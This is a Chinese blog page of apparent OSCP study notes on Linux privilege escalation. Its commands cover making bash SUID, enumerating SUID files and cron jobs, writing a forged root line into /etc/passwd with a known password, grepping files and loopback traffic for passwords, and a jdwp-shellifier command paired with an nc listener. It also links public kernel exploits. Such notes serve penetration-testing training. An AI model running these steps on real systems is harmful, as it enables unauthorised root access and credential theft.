<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Linux 提权 | 养猪日记</title>
<meta name=keywords content><meta name=description content='添加路由：
sudo route add -net 192.168.245.1 netmask 255.255.255.0 gw 192.168.45.254
sudo route add -net <目标网络> netmask <掩码> gw <网关地址>
有gcc先考虑内核提权，存在少量情况是没有GCC，交叉编译；
chmod u+s /bin/bash
/bin/bash -p 
提权手动，千万注意细节，文件、计划任务特殊、进程
1、SUID：
find / -perm -u=s -type f 2>/dev/null
类似效果
/usr/sbin/getcap -r / 2>/dev/null
2、交互式shell:
python3 -c &#39;import pty;pty.spawn("/bin/bash")&#39;
3、/etc/crontab ！！！ 手动检查
ls -lah /etc/cron*
重点看小时和cron.d
4、sudo -l
5、数据库账密信息
6、家目录文件
7、文件可写：
/etc/passwd
/etc/shadow
/etc/sudoers
8、内核信息：
uname -a    ##打印所有可用的系统信息
uname -r    ##内核版本
uname -n    ##系统主机名。
uname -m    ##查看系统内核架构（64位/32位）
hostname    ##系统主机名
cat /proc/version    ##内核信息
cat /etc/*-release   ##分发信息
cat /etc/issue       ##分发信息
cat /proc/cpuinfo    ##CPU信息
cat /etc/lsb-release   ##Debian 
cat /etc/redhat-release  ##Redhat
ls /boot | grep vmlinuz-


常用方法：
1、确认内核版本：
cat /etc/issue 发行版
uname -r 内核
arch 架构

2、筛选：
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
9、.bashrc'><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/posts/oscp/linux-%E6%8F%90%E6%9D%83/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/posts/oscp/linux-%E6%8F%90%E6%9D%83/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Linux 提权"><meta property="og:description" content='添加路由：
sudo route add -net 192.168.245.1 netmask 255.255.255.0 gw 192.168.45.254
sudo route add -net <目标网络> netmask <掩码> gw <网关地址>
有gcc先考虑内核提权，存在少量情况是没有GCC，交叉编译；
chmod u+s /bin/bash
/bin/bash -p 
提权手动，千万注意细节，文件、计划任务特殊、进程
1、SUID：
find / -perm -u=s -type f 2>/dev/null
类似效果
/usr/sbin/getcap -r / 2>/dev/null
2、交互式shell:
python3 -c &#39;import pty;pty.spawn("/bin/bash")&#39;
3、/etc/crontab ！！！ 手动检查
ls -lah /etc/cron*
重点看小时和cron.d
4、sudo -l
5、数据库账密信息
6、家目录文件
7、文件可写：
/etc/passwd
/etc/shadow
/etc/sudoers
8、内核信息：
uname -a    ##打印所有可用的系统信息
uname -r    ##内核版本
uname -n    ##系统主机名。
uname -m    ##查看系统内核架构（64位/32位）
hostname    ##系统主机名
cat /proc/version    ##内核信息
cat /etc/*-release   ##分发信息
cat /etc/issue       ##分发信息
cat /proc/cpuinfo    ##CPU信息
cat /etc/lsb-release   ##Debian 
cat /etc/redhat-release  ##Redhat
ls /boot | grep vmlinuz-


常用方法：
1、确认内核版本：
cat /etc/issue 发行版
uname -r 内核
arch 架构

2、筛选：
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
9、.bashrc'><meta property="og:type" content="article"><meta property="og:url" content="https://yangzhuzai.github.io/posts/oscp/linux-%E6%8F%90%E6%9D%83/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-11T14:25:59+08:00"><meta property="article:modified_time" content="2024-10-11T14:25:59+08:00"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Linux 提权"><meta name=twitter:description content='添加路由：
sudo route add -net 192.168.245.1 netmask 255.255.255.0 gw 192.168.45.254
sudo route add -net <目标网络> netmask <掩码> gw <网关地址>
有gcc先考虑内核提权，存在少量情况是没有GCC，交叉编译；
chmod u+s /bin/bash
/bin/bash -p 
提权手动，千万注意细节，文件、计划任务特殊、进程
1、SUID：
find / -perm -u=s -type f 2>/dev/null
类似效果
/usr/sbin/getcap -r / 2>/dev/null
2、交互式shell:
python3 -c &#39;import pty;pty.spawn("/bin/bash")&#39;
3、/etc/crontab ！！！ 手动检查
ls -lah /etc/cron*
重点看小时和cron.d
4、sudo -l
5、数据库账密信息
6、家目录文件
7、文件可写：
/etc/passwd
/etc/shadow
/etc/sudoers
8、内核信息：
uname -a    ##打印所有可用的系统信息
uname -r    ##内核版本
uname -n    ##系统主机名。
uname -m    ##查看系统内核架构（64位/32位）
hostname    ##系统主机名
cat /proc/version    ##内核信息
cat /etc/*-release   ##分发信息
cat /etc/issue       ##分发信息
cat /proc/cpuinfo    ##CPU信息
cat /etc/lsb-release   ##Debian 
cat /etc/redhat-release  ##Redhat
ls /boot | grep vmlinuz-


常用方法：
1、确认内核版本：
cat /etc/issue 发行版
uname -r 内核
arch 架构

2、筛选：
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
9、.bashrc'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://yangzhuzai.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Linux 提权","item":"https://yangzhuzai.github.io/posts/oscp/linux-%E6%8F%90%E6%9D%83/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Linux 提权","name":"Linux 提权","description":"添加路由： sudo route add -net 192.168.245.1 netmask 255.255.255.0 gw 192.168.45.254 sudo route add -net \u0026lt;目标网络\u0026gt; netmask \u0026lt;掩码\u0026gt; gw \u0026lt;网关地址\u0026gt;\n有gcc先考虑内核提权，存在少量情况是没有GCC，交叉编译；\nchmod u+s /bin/bash /bin/bash -p 提权手动，千万注意细节，文件、计划任务特殊、进程 1、SUID：\nfind / -perm -u=s -type f 2\u0026gt;/dev/null 类似效果 /usr/sbin/getcap -r / 2\u0026gt;/dev/null 2、交互式shell:\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; 3、/etc/crontab ！！！ 手动检查\nls -lah /etc/cron*\n重点看小时和cron.d\n4、sudo -l\n5、数据库账密信息\n6、家目录文件\n7、文件可写：\n/etc/passwd /etc/shadow /etc/sudoers 8、内核信息：\nuname -a ##打印所有可用的系统信息 uname -r ##内核版本 uname -n ##系统主机名。 uname -m ##查看系统内核架构（64位/32位） hostname ##系统主机名 cat /proc/version ##内核信息 cat /etc/*-release ##分发信息 cat /etc/issue ##分发信息 cat /proc/cpuinfo ##CPU信息 cat /etc/lsb-release ##Debian cat /etc/redhat-release ##Redhat ls /boot | grep vmlinuz- 常用方法： 1、确认内核版本： cat /etc/issue 发行版 uname -r 内核 arch 架构 2、筛选： searchsploit \u0026#34;linux kernel Ubuntu 16 Local Privilege Escalation\u0026#34; | grep \u0026#34;4.\u0026#34; | grep -v \u0026#34; \u0026lt; 4.4.0\u0026#34; | grep -v \u0026#34;4.8\u0026#34; 9、.bashrc\n","keywords":[],"articleBody":"添加路由： sudo route add -net 192.168.245.1 netmask 255.255.255.0 gw 192.168.45.254 sudo route add -net \u003c目标网络\u003e netmask \u003c掩码\u003e gw \u003c网关地址\u003e\n有gcc先考虑内核提权，存在少量情况是没有GCC，交叉编译；\nchmod u+s /bin/bash /bin/bash -p 提权手动，千万注意细节，文件、计划任务特殊、进程 1、SUID：\nfind / -perm -u=s -type f 2\u003e/dev/null 类似效果 /usr/sbin/getcap -r / 2\u003e/dev/null 2、交互式shell:\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' 3、/etc/crontab ！！！ 手动检查\nls -lah /etc/cron*\n重点看小时和cron.d\n4、sudo -l\n5、数据库账密信息\n6、家目录文件\n7、文件可写：\n/etc/passwd /etc/shadow /etc/sudoers 8、内核信息：\nuname -a ##打印所有可用的系统信息 uname -r ##内核版本 uname -n ##系统主机名。 uname -m ##查看系统内核架构（64位/32位） hostname ##系统主机名 cat /proc/version ##内核信息 cat /etc/*-release ##分发信息 cat /etc/issue ##分发信息 cat /proc/cpuinfo ##CPU信息 cat /etc/lsb-release ##Debian cat /etc/redhat-release ##Redhat ls /boot | grep vmlinuz- 常用方法： 1、确认内核版本： cat /etc/issue 发行版 uname -r 内核 arch 架构 2、筛选： searchsploit \"linux kernel Ubuntu 16 Local Privilege Escalation\" | grep \"4.\" | grep -v \" \u003c 4.4.0\" | grep -v \"4.8\" 9、.bashrc\nenv cat .bashrc 10、进程监控\nwatch -n 1 \"ps -aux | grep pass\" sudo tcpdump -i lo -A | grep \"pass\" 11、系统日志查计划任务\ngrep \"CRON\" /var/log/syslog 12、备份文件\n特别是一些目录下的：var、opt、tmp\n13、端口，不对外开放的那种\n目前可能存在web高权限、java调试应用等\n14、当前权限用户家目录\n常用技巧 查找doas相关的文件：\nfind / -name *local.txt* -type f 2\u003e/dev/null 查找内容中带有pass的文件：\ngrep -R -i pass /home/* 2\u003e/dev/null 查找某个用户的文件：\nfind / -type f -user delx 2\u003e/dev/null 查看程序内容：\nstrings xxx 生成passwd密码：\nopenssl passwd -1 $1$8PxO.i7T$aDaohw/CLzjdaIOK8BrDy1 root:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash #Abcd1234 辅助脚本\nhttps://pentestmonkey.net/tools/audit/unix-privesc-check https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS 2021-4034 带有polkit可尝试\nhttps://github.com/dzonerzy/poc-cve-2021-4034/releases/tag/v0.2 DirtyPipe https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c jdwp-shellifier java 提权 proxychains4 python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' -c 'chmod u+s /bin/bash nc 192.168.224.150 5000 ","wordCount":"220","inLanguage":"en","image":"https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-10-11T14:25:59+08:00","dateModified":"2024-10-11T14:25:59+08:00","author":{"@type":"Person","name":"养猪日记"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://yangzhuzai.github.io/posts/oscp/linux-%E6%8F%90%E6%9D%83/"},"publisher":{"@type":"Organization","name":"养猪日记","logo":{"@type":"ImageObject","url":"https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Linux 提权</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;220 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#常用技巧>常用技巧</a></li></ul></nav></div></details></div><div class=post-content><p>添加路由：
sudo route add -net 192.168.245.1 netmask 255.255.255.0 gw 192.168.45.254
sudo route add -net &lt;目标网络> netmask &lt;掩码> gw &lt;网关地址></p><p>有gcc先考虑内核提权，存在少量情况是没有GCC，交叉编译；</p><pre tabindex=0><code>chmod u+s /bin/bash
/bin/bash -p 
</code></pre><h1 id=提权手动千万注意细节文件计划任务特殊进程>提权手动，千万注意细节，文件、计划任务特殊、进程<a hidden class=anchor aria-hidden=true href=#提权手动千万注意细节文件计划任务特殊进程>#</a></h1><p>1、SUID：</p><pre tabindex=0><code>find / -perm -u=s -type f 2&gt;/dev/null
类似效果
/usr/sbin/getcap -r / 2&gt;/dev/null
</code></pre><p>2、交互式shell:</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</code></pre><p>3、/etc/crontab ！！！ 手动检查</p><p>ls -lah /etc/cron*</p><p>重点看<strong>小时</strong>和<strong>cron.d</strong></p><p>4、sudo -l</p><p>5、数据库账密信息</p><p>6、家目录文件</p><p>7、文件可写：</p><pre tabindex=0><code>/etc/passwd
/etc/shadow
/etc/sudoers
</code></pre><p>8、内核信息：</p><pre tabindex=0><code>uname -a    ##打印所有可用的系统信息
uname -r    ##内核版本
uname -n    ##系统主机名。
uname -m    ##查看系统内核架构（64位/32位）
hostname    ##系统主机名
cat /proc/version    ##内核信息
cat /etc/*-release   ##分发信息
cat /etc/issue       ##分发信息
cat /proc/cpuinfo    ##CPU信息
cat /etc/lsb-release   ##Debian 
cat /etc/redhat-release  ##Redhat
ls /boot | grep vmlinuz-


常用方法：
1、确认内核版本：
cat /etc/issue 发行版
uname -r 内核
arch 架构

2、筛选：
searchsploit &#34;linux kernel Ubuntu 16 Local Privilege Escalation&#34;   | grep  &#34;4.&#34; | grep -v &#34; &lt; 4.4.0&#34; | grep -v &#34;4.8&#34;
</code></pre><p>9、.bashrc</p><pre tabindex=0><code>env
cat .bashrc
</code></pre><p>10、进程监控</p><pre tabindex=0><code>watch -n 1 &#34;ps -aux | grep pass&#34;

sudo tcpdump -i lo -A | grep &#34;pass&#34;
</code></pre><p>11、系统日志查计划任务</p><pre tabindex=0><code>grep &#34;CRON&#34; /var/log/syslog
</code></pre><p><strong>12、备份文件</strong></p><p>特别是一些目录下的：var、opt、tmp</p><p>13、端口，不对外开放的那种</p><p>目前可能存在web高权限、java调试应用等</p><p>14、当前权限用户家目录</p><h2 id=常用技巧>常用技巧<a hidden class=anchor aria-hidden=true href=#常用技巧>#</a></h2><p>查找doas相关的文件：</p><pre tabindex=0><code>find / -name *local.txt* -type f 2&gt;/dev/null
</code></pre><p>查找内容中带有pass的文件：</p><pre tabindex=0><code>grep -R -i pass /home/* 2&gt;/dev/null
</code></pre><p>查找某个用户的文件：</p><pre tabindex=0><code>find / -type f -user delx 2&gt;/dev/null
</code></pre><p>查看程序内容：</p><pre tabindex=0><code>strings xxx
</code></pre><p>生成passwd密码：</p><pre tabindex=0><code>openssl passwd -1

$1$8PxO.i7T$aDaohw/CLzjdaIOK8BrDy1

root:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash  #Abcd1234
</code></pre><p>辅助脚本</p><pre tabindex=0><code>https://pentestmonkey.net/tools/audit/unix-privesc-check

https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
</code></pre><h1 id=2021-4034>2021-4034<a hidden class=anchor aria-hidden=true href=#2021-4034>#</a></h1><p>带有polkit可尝试</p><pre tabindex=0><code>https://github.com/dzonerzy/poc-cve-2021-4034/releases/tag/v0.2
</code></pre><h1 id=dirtypipe>DirtyPipe<a hidden class=anchor aria-hidden=true href=#dirtypipe>#</a></h1><pre tabindex=0><code>https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c
</code></pre><p><img loading=lazy src=/oscp_img/Pasted%20image%2020240327161524.png alt></p><h1 id=jdwp-shellifier-java-提权>jdwp-shellifier java 提权<a hidden class=anchor aria-hidden=true href=#jdwp-shellifier-java-提权>#</a></h1><pre tabindex=0><code>proxychains4 python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on &#39;java.lang.String.indexOf&#39; -c &#39;chmod u+s /bin/bash

nc 192.168.224.150 5000
</code></pre></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://yangzhuzai.github.io/posts/oscp/kali-%E7%8E%AF%E5%A2%83%E7%88%AC%E5%9D%91/><span class=title>« Prev</span><br><span>kali 环境爬坑</span>
</a><a class=next href=https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/log4j2/><span class=title>Next »</span><br><span>Log4j2</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>